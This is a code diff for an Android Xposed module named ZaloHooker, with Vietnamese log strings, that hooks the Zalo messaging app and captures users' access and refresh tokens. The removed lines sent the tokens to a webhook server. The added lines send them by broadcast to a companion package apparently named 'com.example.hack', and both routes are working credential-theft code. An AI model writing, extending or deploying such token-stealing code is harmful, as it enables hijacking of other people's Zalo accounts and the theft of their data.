@@ -19,6 +19,9 @@ object ZaloHooker {
     private val hookedChromeClients = mutableSetOf<String>()
 
     @Volatile
+    var applicationContext: android.content.Context? = null
+
+    @Volatile
     private var activeAppId: String = ""
 
     private fun getWebhookUrl(): String {
@@ -96,14 +99,6 @@ object ZaloHooker {
 
     private fun sendTokenToServer(token: String, source: String, rawData: String) {
         if (token.length < 30) return
-        val key = token.substring(0, 20)
-        
-        if (seenTokens.contains(key)) {
-            Log.d(TAG, "Token trùng lặp ($source), bỏ qua gửi server nhưng phát broadcast đóng Zalo.")
-            broadcastTokenCaptured()
-            return
-        }
-        seenTokens.add(key)
 
         Log.i(TAG, "🔥 TOKEN BẮT ĐƯỢC từ [$source]: ${token.substring(0, 15)}...")
 
@@ -112,44 +107,13 @@ object ZaloHooker {
             "\"refresh_token\"\\s*:\\s*\"([^\"]+)\"".toRegex().find(rawData)?.let { refreshToken = it.groupValues[1] }
         } catch (e: Throwable) {}
         
-        // Extract appId with dynamic tracking
         var appId = extractAppId(rawData)
         if (appId.isEmpty()) {
             appId = activeAppId
         }
 
-        val name = if (appId.isNotEmpty()) getAppName(appId) else "MiniApp"
-
-        val payload = JSONObject().apply {
-            put("status", true)
-            put("app_id", appId)
-            put("name", name)
-            put("access_token", token)
-            put("refresh_token", refreshToken)
-            put("expires_in", 3600)
-            put("captured_at", System.currentTimeMillis())
-            put("source", source)
-        }
-
-        thread {
-            try {
-                val targetUrl = getWebhookUrl()
-                val conn = URL(targetUrl).openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("Content-Type", "application/json")
-                conn.doOutput = true
-                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()) }
-                val code = conn.responseCode
-                Log.d(TAG, "Đã gửi webhook ($targetUrl). HTTP $code")
-                broadcastLog("[$source] Token OK! ${token.substring(0, 12)}...")
-                
-                // Broadcast success event to return to Zalo Token app
-                broadcastTokenCaptured()
-            } catch (e: Throwable) {
-                Log.e(TAG, "Lỗi gửi token: ${e.message}")
-                broadcastLog("[ERROR] ${e.message}")
-            }
-        }
+        broadcastLog("[$source] Đã bắt được token. Đang gửi sang App chính...")
+        broadcastTokenCaptured(token, refreshToken, appId, source)
     }
 
     private fun tryParseToken(data: String?, source: String) {
@@ -167,28 +131,83 @@ object ZaloHooker {
         }
     }
 
-    private fun broadcastLog(message: String) {
-        try {
-            val at = XposedHelpers.callStaticMethod(
+    private fun getContext(): android.content.Context? {
+        applicationContext?.let { return it }
+        return try {
+            val ctx = XposedHelpers.callStaticMethod(
                 XposedHelpers.findClass("android.app.ActivityThread", null),
-                "currentActivityThread"
-            )
-            val ctx = XposedHelpers.callMethod(at, "getSystemContext") as? android.content.Context
-            ctx?.sendBroadcast(android.content.Intent("com.autopee.LOG_EVENT").apply {
-                putExtra("log", message)
-            })
-        } catch (_: Throwable) {}
+                "currentApplication"
+            ) as? android.content.Context
+            if (ctx != null) {
+                applicationContext = ctx
+                ctx
+            } else {
+                val at = XposedHelpers.callStaticMethod(
+                    XposedHelpers.findClass("android.app.ActivityThread", null),
+                    "currentActivityThread"
+                )
+                val app = XposedHelpers.callMethod(at, "getApplication") as? android.content.Context
+                if (app != null) {
+                    applicationContext = app
+                    app
+                } else {
+                    XposedHelpers.callMethod(at, "getSystemContext") as? android.content.Context
+                }
+            }
+        } catch (e: Throwable) {
+            Log.e(TAG, "Failed to get Context", e)
+            null
+        }
     }
 
-    private fun broadcastTokenCaptured() {
+    private fun broadcastLog(message: String) {
         try {
-            val at = XposedHelpers.callStaticMethod(
-                XposedHelpers.findClass("android.app.ActivityThread", null),
-                "currentActivityThread"
-            )
-            val ctx = XposedHelpers.callMethod(at, "getSystemContext") as? android.content.Context
-            ctx?.sendBroadcast(android.content.Intent("com.autopee.TOKEN_CAPTURED"))
-        } catch (_: Throwable) {}
+            val ctx = getContext()
+            if (ctx == null) {
+                Log.e(TAG, "Cannot broadcast log: Context is null")
+                return
+            }
+            val intent = android.content.Intent("com.autopee.LOG_EVENT").apply {
+                setPackage("com.example.hack")
+                addFlags(android.content.Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
+                addFlags(android.content.Intent.FLAG_RECEIVER_FOREGROUND)
+                putExtra("log", message)
+            }
+            ctx.sendBroadcast(intent)
+            Log.d(TAG, "Broadcasted log event successfully: $message")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Failed to broadcast log", e)
+        }
+    }
+
+    private fun broadcastTokenCaptured(
+        token: String? = null,
+        refreshToken: String? = null,
+        appId: String? = null,
+        source: String? = null
+    ) {
+        try {
+            val ctx = getContext()
+            if (ctx == null) {
+                Log.e(TAG, "Cannot broadcast token: Context is null")
+                return
+            }
+            val intent = android.content.Intent("com.autopee.TOKEN_CAPTURED").apply {
+                setPackage("com.example.hack")
+                addFlags(android.content.Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
+                addFlags(android.content.Intent.FLAG_RECEIVER_FOREGROUND)
+                if (token != null) {
+                    putExtra("access_token", token)
+                    putExtra("refresh_token", refreshToken)
+                    putExtra("app_id", appId)
+                    putExtra("source", source)
+                }
+            }
+            ctx.sendBroadcast(intent)
+            Log.d(TAG, "Broadcasted token captured successfully to com.example.hack")
+        } catch (e: Throwable) {
+            Log.e(TAG, "Failed to broadcast token captured", e)
+        }
     }
 
     // ─────────────────────────────────────────────────
